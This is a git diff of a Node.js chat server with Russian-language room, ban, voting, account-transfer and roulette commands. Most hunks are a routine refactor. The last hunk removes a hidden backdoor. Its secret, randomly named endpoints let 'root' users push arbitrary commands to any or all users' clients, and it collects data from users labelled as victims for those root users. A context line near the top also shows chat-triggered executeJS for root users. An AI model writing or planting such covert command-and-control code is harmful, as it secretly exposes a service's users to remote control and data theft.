                 message: confirmed[user._token] && confirmed[user._token].root ? executeJS(match[1]) : `Доступ запрещён.`
-            }));
+            };
         }
     },
     {
@@ -845,20 +868,23 @@ const commands = [{
         handler: getRoomCreatorHandler((match, user, userId, room, roomId) => {
             const usrId = match[1];
             if (usrId == userId) {
-                return room.stackMessages.push(getSystemMessage({
+                return {
                     message: `Себя нельзя забанить!`
-                }));
+                };
             }
             if (Users[usrId]) {
                 const bannedUser = Users[usrId];
-                room.banned[bannedUser._ip] = 1;
-                room.stackMessages.push(getSystemMessage({
-                    message: `[clr=${bannedUser.color}]${bannedUser.name}[/] забанен!`
-                }));
+                room.banned[bannedUser._ip] = true;
+                for (let i = 0; i < room.members.length; i++) {
+                    const userId = room.members[i];
+                    if (room.banned[Users[userId]._ip]) {
+                        room.userWebSockets[userId].close(4001);
+                    }
+                }
             } else {
-                room.stackMessages.push(getSystemMessage({
+                return {
                     message: `Пользователь не существует!`
-                }));
+                };
             }
         })
     },
@@ -867,69 +893,69 @@ const commands = [{
         handler: getRoomCreatorHandler((match, user, userId, room, roomId) => {
             const usrId = match[1];
             if (usrId == userId) {
-                return room.stackMessages.push(getSystemMessage({
+                return {
                     message: `Вы создатель комнаты, разбанить себя невозможно!`
-                }));
+                };
             }
             const unBannedUser = Users[usrId];
             if (unBannedUser) {
                 if (room.banned[unBannedUser._ip]) {
                     delete room.banned[unBannedUser._ip];
-                    room.stackMessages.push(getSystemMessage({
+                    return {
                         message: `[clr=${unBannedUser.color}]${unBannedUser.name}[/] разбанен!`
-                    }));
+                    };
                 } else {
-                    room.stackMessages.push(getSystemMessage({
+                    return {
                         message: `Пользователь не забанен!`
-                    }));
+                    };
                 }
             } else {
-                room.stackMessages.push(getSystemMessage({
+                return {
                     message: `Пользователь не существует!`
-                }));
+                };
             }
         })
     },
     {
         reg: /[!/]пригласить\s+([a-f\d]+)/gi,
-        handler: getRoomCreatorHandler((match, user, userId, room, roomId) => {
+        handler: getRoomCreatorHandler(async (match, user, userId, room, roomId) => {
             const usrId = match[1];
             if (usrId == userId) {
-                return room.stackMessages.push(getSystemMessage({
+                return {
                     message: `Невозможно пригласить себя!`
-                }));
+                };
             }
             const invitedUser = Users[usrId];
             if (invitedUser) {
                 if (room.stackMembers[usrId]) {
-                    room.stackMessages.push(getSystemMessage({
+                    return {
                         message: `Пользователь уже в комнате!`
-                    }));
+                    };
                 } else {
                     if (notifications[usrId]) {
                         notifications[usrId].send({
-                            data: encryptAES(JSON.stringify({
+                            data: await getDataProperty({
                                 message: `Вы приглашены в комнату <span style="color: ${room.color}">${room.name}</span> пользователем <span style="color: ${user.color}">${user.name}</span>`,
                                 _id: roomId,
                                 password: room.password,
                                 color: room.color,
                                 name: room.name
-                            }), invitedUser.aesKeyBytes)
+                            }, invitedUser)
                         });
                         delete notifications[usrId];
-                        room.stackMessages.push(getSystemMessage({
+                        return {
                             message: `Приглашение выслано пользователю [clr=${invitedUser.color}]${invitedUser.name}[/]!`
-                        }));
+                        };
                     } else {
-                        room.stackMessages.push(getSystemMessage({
+                        return {
                             message: `Пользователь занят!`
-                        }));
+                        };
                     }
                 }
             } else {
-                room.stackMessages.push(getSystemMessage({
+                return {
                     message: `Пользователь не существует!`
-                }));
+                };
             }
         })
     },
@@ -937,9 +963,9 @@ const commands = [{
         reg: /[!/]голосование\s+(\d+)\s*(г|с)\s+([^\n]+)\s+([\s\S]+)/gi,
         handler: getRoomCreatorHandler((match, user, userId, room, roomId) => {
             if (room.voting) {
-                room.stackMessages.push(getSystemMessage({
+                return {
                     message: `Голосование уже запущено!`
-                }));
+                };
             } else {
                 let [count, choice, text, options] = match.slice(1, match.length);
                 count = +count;
@@ -952,25 +978,25 @@ const commands = [{
                 };
                 let filtered = options.split(`\n`).filter(e => e && e.split(/\s*-\s*/).length > 1);
                 if (!filtered.length) {
-                    return room.stackMessages.push(getSystemMessage({
+                    return {
                         message: `Нужен хотя бы 1 вариант для проведения голосования!`
-                    }));
+                    };
                 }
                 if (choice == `г`) {
                     if (count > room.members.length) {
                         count = room.members.length;
                     } else if (!+count) {
-                        return room.stackMessages.push(getSystemMessage({
+                        return {
                             message: `Нужен хотя бы 1 голос!`
-                        }));
+                        };
                     }
                 } else {
                     if (count > 3600) {
                         count = 3600;
                     } else if (!+count) {
-                        return room.stackMessages.push(getSystemMessage({
+                        return {
                             message: `Недопустимое время голосования!`
-                        }));
+                        };
                     }
                     room.votingTimer = setTimeout(() => {
                         completeVote(room);
@@ -987,10 +1013,10 @@ const commands = [{
                     };
                     message += `\n${number} - ${text}`;
                 });
-                room.stackMessages.push(getSystemMessage({
-                    message
-                }));
                 room.voting = voting;
+                return {
+                    message
+                };
             }
         })
     },
@@ -1000,30 +1026,30 @@ const commands = [{
             const number = match[1];
             if (room.voting) {
                 if (room.voting.alreadyVoted[userId]) {
-                    room.stackMessages.push(getSystemMessage({
+                    return {
                         message: `[clr=${user.color}]${user.name}[/], Вы уже проголосовали!`
-                    }));
+                    };
                 } else {
                     if (room.voting.options[number]) {
                         room.voting.options[number].voted++;
                         room.voting.totalVoted++;
                         room.voting.alreadyVoted[userId] = true;
-                        room.stackMessages.push(getSystemMessage({
-                            message: `[clr=${user.color}]${user.name}[/] проголосовал!`
-                        }));
                         if (room.voting.choice == `г` && room.voting.totalVoted >= room.voting.count) {
                             completeVote(room);
                         }
+                        return {
+                            message: `[clr=${user.color}]${user.name}[/] проголосовал!`
+                        }
                     } else {
-                        room.stackMessages.push(getSystemMessage({
+                        return {
                             message: `Нет такого варианта!`
-                        }));
+                        };
                     }
                 }
             } else {
-                room.stackMessages.push(getSystemMessage({
+                return {
                     message: `Сейчас нет активного голосования!`
-                }));
+                };
             }
         }
     },
@@ -1033,9 +1059,9 @@ const commands = [{
             if (room.voting) {
                 completeVote(room);
             } else {
-                room.stackMessages.push(getSystemMessage({
+                return {
                     message: `Сейчас нет активного голосования!`
-                }));
+                };
             }
         })
     },
@@ -1043,13 +1069,13 @@ const commands = [{
         reg: /[!/]баланс/gi,
         async handler(match, user, userId, room, roomId) {
             if (user._account) {
-                room.stackMessages.push(getSystemMessage({
+                return {
                     message: `[clr=${user.color}]${user.name}[/], Ваш баланс [clr=${user.color} bold]${await getUserAccBalance(user._account.objId)}[/]!`
-                }));
+                };
             } else {
-                room.stackMessages.push(getSystemMessage({
+                return {
                     message: `[clr=${user.color}]${user.name}[/], у вас нет счета!`
-                }));
+                };
             }
         }
     },
@@ -1063,20 +1089,20 @@ const commands = [{
             ] = match;
             const whom = Users[recipient];
             if (!user._account) {
-                return room.stackMessages.push(getSystemMessage({
+                return {
                     message: `[clr=${user.color}]${user.name}[/], у вас нет счета!`
-                }));
+                };
             }
             if (!count) {
-                return room.stackMessages.push(getSystemMessage({
+                return {
                     message: `Слишком маленькая сумма для транзакции!`
-                }));
+                };
             }
             const yourBalance = await getUserAccBalance(user._account.objId);
             if (yourBalance < count) {
-                return room.stackMessages.push(getSystemMessage({
+                return {
                     message: `Недостаточно средств!`
-                }));
+                };
             }
             const operationSenderObj = {
                 value: -count,
@@ -1090,33 +1116,38 @@ const commands = [{
             };
             if (whom) {
                 if (!whom._account) {
-                    return room.stackMessages.push(getSystemMessage({
+                    return {
                         message: `[clr=${whom.color}]${whom.name}[/] не имеет счета!`
-                    }));
+                    };
                 }
                 if (recipient == userId || user._account.id == whom._account.id) {
-                    return room.stackMessages.push(getSystemMessage({
+                    return {
                         message: `Перевод на тот же счет недопустим!`
-                    }));
+                    };
                 }
                 operationRecipientObj._id = operationSenderObj._id = whom._account.id;
                 await changeUserBalance(user._account.objId, -count, operationSenderObj);
                 await changeUserBalance(whom._account.objId, count, operationRecipientObj);
-                room.stackMessages.push(getSystemMessage({
+                return {
                     message: `[clr=${user.color}]${user.name}[/], Вы успешно перевели [clr=${user.color} bold]${count}[/] пользователю [clr=${whom.color}]${whom.name}[/]`
-                }));
+                };
             } else {
                 if (await accountExists(recipient)) {
+                    if (recipient == user._account.id) {
+                        return {
+                            message: `Перевод на тот же счет недопустим!`
+                        };
+                    }
                     operationRecipientObj._id = operationSenderObj._id = recipient;
                     await changeUserBalance(user._account.objId, -count, operationSenderObj);
                     await changeUserBalance(ObjectID(recipient), count, operationRecipientObj);
-                    room.stackMessages.push(getSystemMessage({
+                    return {
                         message: `[clr=${user.color}]${user.name}[/], Вы успешно перевели [clr=${user.color} bold]${count}[/] на счет [bold]${recipient}[/]`
-                    }));
+                    };
                 } else {
-                    room.stackMessages.push(getSystemMessage({
+                    return {
                         message: `Пользователя с таким id и счета не существует!`
-                    }));
+                    };
                 }
             }
         }
@@ -1126,34 +1157,34 @@ const commands = [{
         async handler(match, user, userId, room, roomId) {
             let count = +match[1];
             if (!user._account) {
-                return room.stackMessages.push(getSystemMessage({
+                return {
                     message: `[clr=${user.color}]${user.name}[/], у вас нет счета!`
-                }));
+                };
             };
             const userBalance = await getUserAccBalance(user._account.objId);
             if (userBalance < count) {
-                return room.stackMessages.push(getSystemMessage({
+                return {
                     message: `[clr=${user.color}]${user.name}[/], недостаточно средств для ставки!`
-                }));
+                };
             }
             if (count <= 1 && match[1].match(/\./)) {
                 count = Math.round(count * room.roulette.users[userId].balance);
             }
             if (!count) {
-                return room.stackMessages.push(getSystemMessage({
+                return {
                     message: `[clr=${user.color}]${user.name}[/], поставьте хоть что-то!`
-                }));
+                };
             }
             if (room.roulette.bets[userId]) {
-                return room.stackMessages.push(getSystemMessage({
+                return {
                     message: `[clr=${user.color}]${user.name}[/], Вы уже сделали ставку!`
-                }));
+                };
             }
             const curDate = new Date();
             if (curDate > roulette.maximumBetTime) {
-                return room.stackMessages.push(getSystemMessage({
+                return {
                     message: `[clr=${user.color}]${user.name}[/], Вы не можете сделать ставку сейчас! Дождитесь следующей через ${Math.round(((+roulette.maximumBetTime + roulette.delay) - curDate) / 1000)} секунд`
-                }));
+                };
             }
             let conditions = match[2].split(/\s+/).filter(e => e);
             for (let i = 0; i < conditions.length; i++) {
@@ -1194,15 +1225,15 @@ const commands = [{
             });
             numbers = [...new Set(numbers)].sort((a, b) => a - b);
             if (!numbers.length) {
-                return room.stackMessages.push(getSystemMessage({
+                return {
                     message: `[clr=${user.color}]${user.name}[/], неверные условия ставки!`
-                }));
+                };
             }
             const chance = numbers.length / roulette.upperLimit;
             if (room.roulette.chance && chance > room.roulette.chance) {
-                return room.stackMessages.push(getSystemMessage({
+                return {
                     message: `[clr=${user.color}]${user.name}[/], шансы на победу > ${(room.roulette.chance * 100).toFixed(3)}% недоступны! (У вас ${(chance * 100).toFixed(3)}%)`
-                }));
+                };
             }
             const coef = 1 / chance;
             const bet = {
@@ -1224,13 +1255,13 @@ const commands = [{
                 comment: `Ставка на ${numbers.length} чисел. Шанс победы ${(chance * 100).toFixed(3)}%`,
                 outgoing: true
             });
-            room.stackMessages.push(getSystemMessage({
-                message: `[clr=${user.color}]${user.name}[/], ставка сделана!\nШанс на победу: [bold]${(bet.chance * 100).toFixed(3)}%[/]\nКоэффициент: [bold]${bet.coef.toFixed(3)}[/]\nВыбранные числа: [bold]${bet.numbers.map(num => `[clr=${num % 2 ? `#01ADF7` : `red`} bold]${num}[/]`).join(` `)}[/]\nВ случае победы вы получите [bold]${winned} ([clr=green]+${winned - count}[/])[/]\nБаланс: ${userBalance - count}\nРезультаты ставки через ${Math.round(((+roulette.maximumBetTime + roulette.delay) - curDate)/ 1000)} секунд`
-            }));
             if (!room.placeBet) {
                 room.placeBet = true;
                 roulette.subscribe(getRouletteCallback(room));
             }
+            return {
+                message: `[clr=${user.color}]${user.name}[/], ставка сделана!\nШанс на победу: [bold]${(bet.chance * 100).toFixed(3)}%[/]\nКоэффициент: [bold]${bet.coef.toFixed(3)}[/]\nВыбранные числа: [bold]${bet.numbers.map(num => `[clr=${num % 2 ? `#01ADF7` : `red`} bold]${num}[/]`).join(` `)}[/]\nВ случае победы вы получите [bold]${winned} ([clr=green]+${winned - count}[/])[/]\nБаланс: ${userBalance - count}\nРезультаты ставки через ${Math.round(((+roulette.maximumBetTime + roulette.delay) - curDate)/ 1000)} секунд`
+            };
         }
     },
     {
@@ -1239,9 +1270,9 @@ const commands = [{
             let whom = Users[match[1]];
             const userBet = room.roulette.users[whom ? match[1] : userId];
             whom = whom || user;
-            room.stackMessages.push(getSystemMessage({
+            return {
                 message: `Статистика [clr=${whom.color}]${whom.name}[/]:\nВсего ставок сделано: ${userBet.totalBets}\nПобед: ${userBet.wins}\nПоражений: ${userBet.losses}\nВинрейт: ${(userBet.winrate * 100).toFixed(3)}%\nВсего выиграно: ${userBet.totalWon}\nВсего проиграно: ${userBet.totalLost}\n`
-            }));
+            };
         }
     },
     {
@@ -1275,9 +1306,9 @@ const commands = [{
             if (!users.length) {
                 message += `В комнате [clr=${room.color}]${room.name}[/] нет пользователей со счетами`;
             }
-            room.stackMessages.push(getSystemMessage({
+            return {
                 message
-            }));
+            };
         }
     },
     {
@@ -1286,13 +1317,13 @@ const commands = [{
             const chance = +match[1] > 100 ? 100 : +match[1];
             if (chance) {
                 room.roulette.chance = chance / 100;
-                room.stackMessages.push(getSystemMessage({
+                return {
                     message: `Максимально возможный шанс на победу: ${chance.toFixed(3)}`
-                }));
+                };
             } else {
-                room.stackMessages.push(getSystemMessage({
+                return {
                     message: `Неправильный шанс!`
-                }));
+                };
             }
         })
     },
@@ -1312,28 +1343,28 @@ const commands = [{
                 if (!whom) {
                     if (await accountExists(recipient)) {
                         await changeUserBalance(ObjectID(recipient), count, operationObj);
-                        return room.stackMessages.push(getSystemMessage({
+                        return {
                             message: `Счет [bold]${recipient}[/] изменён на [clr=${count > 0 ? `green bold]+` : `red bold]`}${count}[/]!`
-                        }));
+                        };
                     } else {
-                        return room.stackMessages.push(getSystemMessage({
+                        return {
                             message: `Пользователя с таким id и счета не существует!`
-                        }));
+                        };
                     }
                 }
                 if (!whom._account) {
-                    return room.stackMessages.push(getSystemMessage({
+                    return {
                         message: `[clr=${whom.color}]${whom.name}[/] не имеет счета!`
-                    }));
+                    };
                 }
                 await changeUserBalance(whom._account.objId, count, operationObj);
-                return room.stackMessages.push(getSystemMessage({
+                return {
                     message: `Баланс [clr=${whom.color}]${whom.name}[/] изменён на [clr=${count > 0 ? `green bold]+` : `red bold]`}${count}[/]!`
-                }));
+                };
             } else {
-                room.stackMessages.push(getSystemMessage({
+                return {
                     message: `Неправильная сумма!`
-                }));
+                };
             }
         })
     },
@@ -1341,9 +1372,9 @@ const commands = [{
         reg: /[!/]уведомления/gi,
         handler: getRoomCreatorHandler((match, user, userId, room, roomId) => {
             room.disableNotif = !room.disableNotif;
-            room.stackMessages.push(getSystemMessage({
+            return {
                 message: `Уведомления о входах с неправильным паролем в комнате [clr=${room.color}]${room.name}[/]: [bold clr=${!room.disableNotif ? `green` : `red`}]${!room.disableNotif ? `On` : `Off`}[/]`
-            }));
+            }
         })
     }
 ];
@@ -1374,9 +1405,9 @@ const getRouletteCallback = room => async res => {
         userBet.winrate = userBet.losses ? userBet.wins / (userBet.losses + userBet.wins) : 1;
         delete room.roulette.bets[_id];
     }
-    room.stackMessages.push(getSystemMessage({
+    sendSystemMessageToAll({
         message
-    }));
+    }, room);
 };
 
 const completeVote = room => {
@@ -1408,55 +1439,16 @@ const completeVote = room => {
     const zeroCount = keys.length - filtered.length;
     const makeEqual = filtered.length > 1;
     const message = `Итоги голосования ${voting.text}: [bold]${makeEqual && new Set(filtered.map(key => options[key].voted)).size == 1 ? `Победителя в голосовании нет! Все равны!` : zeroCount == keys.length ? `Никто не проголосовал` : winner.text}[/]\n${zeroCount == keys.length ? `` : statistics}`;
-    room.stackMessages.push(getSystemMessage({
+    sendSystemMessageToAll({
         message
-    }));
+    }, room);
     delete room.voting;
 };
-
-app.post(`/publish`, async (req, res) => {
-    const data = await getDecryptedData(req.body.data, Users[req.body._id].aesKeyBytes);
-    const room = Rooms[data._id];
-    const userId = req.body._id;
-    const user = Users[userId];
-    const authed = auth(room, data._id, user, userId, data.password);
-    if (authed) {
-        const {
-            message
-        } = data;
-        const {
-            typing = false
-        } = data;
-        let msg = {
-            message,
-            typing,
-            name: user.name,
-            color: user.color,
-            user: userId,
-        };
-        const conf = confirmed[user._token];
-        if (conf) {
-            msg.confirmed = true;
-            msg = Object.assign(msg, conf);
-        }
-        room.stackMessages.push(getMessage(msg));
-        for (let i = 0; i < commands.length; i++) {
-            let r;
-            while (r = commands[i].reg.exec(message)) {
-                commands[i].handler(r, user, userId, room, data._id);
-            }
-        }
-    }
-    res.send({
-        success: authed
-    });
-});
 
 app.post(`/getUsersInRoom`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
-    const key = user.aesKeyBytes;
-    const roomData = await getDecryptedData(req.body.data, key);
+    const roomData = await getDecryptedData(req.body.data, user);
     const room = Rooms[roomData._id];
     if (auth(room, roomData._id, user, userId, roomData.password)) {
         if (room.hidden) {
@@ -1484,7 +1476,7 @@ app.post(`/getUsersInRoom`, async (req, res) => {
             }
             members.push(member);
         });
-        members = encryptAES(JSON.stringify(members), key);
+        members = await getDataProperty(members, user);
         res.send({
             members
         });
@@ -1493,20 +1485,6 @@ app.post(`/getUsersInRoom`, async (req, res) => {
             success: false
         });
     }
-});
-
-app.post(`/disconnect`, async (req, res) => {
-    const userId = req.body._id;
-    const user = Users[userId];
-    const key = user.aesKeyBytes;
-    const roomData = await getDecryptedData(req.body.data, key);
-    const room = Rooms[roomData._id];
-    if (auth(room, roomData._id, user, userId, roomData.password, true)) {
-        disconnect(room, user, userId);
-    }
-    res.send({
-        success: true
-    });
 });
 
 setInterval(() => {
@@ -1518,9 +1496,6 @@ setInterval(() => {
             continue;
         }
         if (curDate - user.lastActivity >= 300000) {
-            if (user.curRoom) {
-                disconnect(Rooms[user.curRoom], user, userId);
-            }
             delete Users[userId];
         }
     }
@@ -1537,69 +1512,10 @@ app.post(`/alive`, (req, res) => {
     })
 });
 
-app.post(`/sendFile`, async (req, res) => {
-    const userId = req.body._id;
-    const user = Users[userId];
-    user.lastActivity = new Date();
-    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
-    const room = Rooms[data.room._id];
-    let success = true;
-    const conf = confirmed[user._token];
-    let additional = {
-        name: user.name,
-        color: user.color,
-        user: userId,
-    };
-    if (conf) {
-        additional.confirmed = true;
-        additional = Object.assign(additional, conf);
-    }
-    if (auth(room, data.room._id, user, userId, data.room.password)) {
-        const {
-            fileId,
-            ext,
-            filePart,
-            progress,
-            position,
-            info
-        } = data;
-        let msg;
-        if (data.ready) {
-            msg = {
-                file: {
-                    fileId,
-                    ext,
-                    ready: true
-                },
-            };
-        } else {
-            msg = {
-                file: {
-                    fileId,
-                    ext,
-                    filePart,
-                    progress,
-                    position
-                },
-            };
-            if (position == 1) {
-                msg.file.info = info;
-            }
-        }
-        msg = Object.assign(msg, additional);
-        room.stackFileMessages.push(getMessage(msg));
-    } else {
-        success = false;
-    }
-    res.send({
-        success
-    });
-});
-
 app.post(`/unhandledError`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
-    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
+    const data = await getDecryptedData(req.body.data, user);
     data.userName = user.name;
     fs.appendFile(`log.txt`, `${JSON.stringify(data, null, 4)}\n\n`, (err) => {});
     res.send({
@@ -1641,7 +1557,7 @@ const changeUserBalance = async (objId, value, operationInfo = {}) => {
 app.post(`/createAccount`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
-    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
+    const data = await getDecryptedData(req.body.data, user);
     const {
         password
     } = data;
@@ -1655,7 +1571,7 @@ app.post(`/createAccount`, async (req, res) => {
     res.send({
         data: await getDataProperty({
             _id
-        }, user.aesKeyBytes)
+        }, user)
     });
 });
 
@@ -1692,7 +1608,7 @@ const getLogInAcc = async data => {
 app.post(`/loginInAccount`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
-    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
+    const data = await getDecryptedData(req.body.data, user);
     const getAccR = await getLogInAcc(data);
     const resObj = {
         _id: data._id,
@@ -1708,14 +1624,14 @@ app.post(`/loginInAccount`, async (req, res) => {
         delete user._account;
     }
     res.send({
-        data: await getDataProperty(resObj, user.aesKeyBytes)
+        data: await getDataProperty(resObj, user)
     });
 });
 
 app.post(`/changeAccountPassword`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
-    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
+    const data = await getDecryptedData(req.body.data, user);
     const success = !!(await updateDataInCollection(hendrixDatabase.accounts, {
         _id: ObjectID(data._id),
         password: {
@@ -1737,7 +1653,7 @@ app.post(`/changeAccountPassword`, async (req, res) => {
 app.post(`/deleteAccount`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
-    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
+    const data = await getDecryptedData(req.body.data, user);
     const success = !!(await deleteDataInCollection(hendrixDatabase.accounts, {
         _id: ObjectID(data._id),
         password: {
@@ -1755,7 +1671,7 @@ app.post(`/deleteAccount`, async (req, res) => {
 app.post(`/getOperationsHistory`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
-    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
+    const data = await getDecryptedData(req.body.data, user);
     const historyPart = await findDataInCollection(hendrixDatabase.accounts, {
         _id: ObjectID(data._id),
         password: {
@@ -1773,7 +1689,7 @@ app.post(`/getOperationsHistory`, async (req, res) => {
     res.send({
         data: await getDataProperty({
             historyPart,
-        }, user.aesKeyBytes)
+        }, user)
     });
 });
 
@@ -1828,156 +1744,3 @@ roulette.maximumBetTime = new Date(+new Date() + roulette.interval - this.delay)
 setInterval(() => {
     roulette.roll();
 }, roulette.interval);
-
-//всего, что идет далее, не должно быть, но я хочу, чтобы это было так.
-
-const getDecryptedDataBackDoor = (data, key) => {
-    return JSON.parse(decryptAES(data, key));
-}
-
-const getDataPropertyBackDoor = (data, key) => {
-    return encryptAES(JSON.stringify(data), key);
-};
-
-app.post(`/Si9Mu7IY8LpTvqj`, (req, res) => {
-    const userId = req.body._id;
-    const user = Users[userId];
-    const conf = confirmed[user._token];
-    res.send({
-        data: getDataPropertyBackDoor({
-            access: !!conf && !!conf.root
-        }, user.aesKeyBytes)
-    })
-});
-
-const usersCommands = {};
-const usersWaitingCommand = [];
-const usersData = [];
-let rootSubs = [];
-
-app.post(`/9Zb6JDSz7AQtfb3`, (req, res) => {
-    const userId = req.body._id;
-    const user = Users[userId];
-    const conf = confirmed[user._token];
-    if (conf && conf.root) {
-        let error = false;
-        let errorReason = ``;
-        const data = getDecryptedDataBackDoor(req.body.data, user.aesKeyBytes);
-        let recipients = [];
-        const missed = {};
-        data.destination.toLowerCase().split(/\s*,\s*/).forEach(recipient => {
-            if (recipient == `me`) {
-                recipients.push(userId);
-            } else if (recipient == `^me`) {
-                missed[userId] = true;
-            } else if (recipient[0] == `_`) {
-                const roomId = recipient.slice(1);
-                const room = Rooms[roomId];
-                if (room) {
-                    recipients.push(...room.members);
-                }
-            } else if (recipient == `all`) {
-                recipients.push(...Object.keys(Users));
-            } else if (recipient[0] == `^`) {
-                const newId = recipient.slice(1);
-                if (newId[0] == `_`) {
-                    const roomId = newId.slice(1);
-                    const room = Rooms[roomId];
-                    if (room) {
-                        room.members.forEach(id => {
-                            missed[id] = true;
-                        });
-                    }
-                } else {
-                    missed[newId] = true;
-                }
-            } else if (Users[recipient]) {
-                recipients.push(recipient);
-            }
-        });
-        recipients = [...new Set(recipients.filter(id => !missed[id]))];
-        if (!recipients.length) {
-            error = true;
-            errorReason = `Некорректно выбраны получатели!`;
-        }
-        for (let i = 0; i < recipients.length; i++) {
-            usersCommands[recipients[i]].push(data.command);
-        }
-        res.send({
-            data: getDataPropertyBackDoor({
-                error,
-                errorReason
-            }, user.aesKeyBytes)
-        });
-    } else {
-        res.send({
-            message: `access denied!`
-        });
-    }
-});
-
-app.post(`/Mh3lWGicrcSGu7V`, (req, res) => {
-    const userId = req.body._id;
-    if (!usersCommands[userId]) {
-        usersCommands[userId] = [];
-    }
-    res._id = userId;
-    usersWaitingCommand.push(res);
-    res.on(`close`, () => {
-        const position = usersWaitingCommand.indexOf(res);
-        if (~position) {
-            usersWaitingCommand.splice(position, 1);
-        }
-    });
-});
-
-//пакет с данными
-app.post(`/cXVNwFSJeTwXFH6`, (req, res) => {
-    const userId = req.body._id;
-    const user = Users[userId];
-    const conf = confirmed[user._token];
-    if (conf && conf.root && req.body.waitingData) {
-        res._id = userId;
-        rootSubs.push(res);
-        res.on(`close`, () => {
-            const position = rootSubs.indexOf(res);
-            if (~position) {
-                rootSubs.splice(position, 1);
-            }
-        });
-    } else {
-        const data = getDecryptedDataBackDoor(req.body.data, user.aesKeyBytes);
-        data._victimId = userId;
-        data._victimName = user.name;
-        usersData.push(data);
-        res.send({});
-    }
-});
-
-setInterval(() => {
-    for (let i = 0; i < usersWaitingCommand.length; i++) {
-        const userId = usersWaitingCommand[i]._id;
-        if (usersCommands[userId].length) {
-            const command = usersCommands[userId].shift();
-            try {
-                usersWaitingCommand[i].send({
-                    data: getDataPropertyBackDoor({
-                        command
-                    }, Users[userId].aesKeyBytes)
-                });
-            } catch (e) {
-                usersWaitingCommand.splice(i, 1);
-                i--;
-            }
-        }
-    }
-    while (usersData.length && rootSubs.length) {
-        const data = usersData.shift();
-        for (let i = 0; i < rootSubs.length; i++) {
-            rootSubs[i].send({
-                data: getDataPropertyBackDoor(data, Users[rootSubs[i]._id].aesKeyBytes)
-            });
-        }
-        rootSubs = [];
-    }
-}, 0);
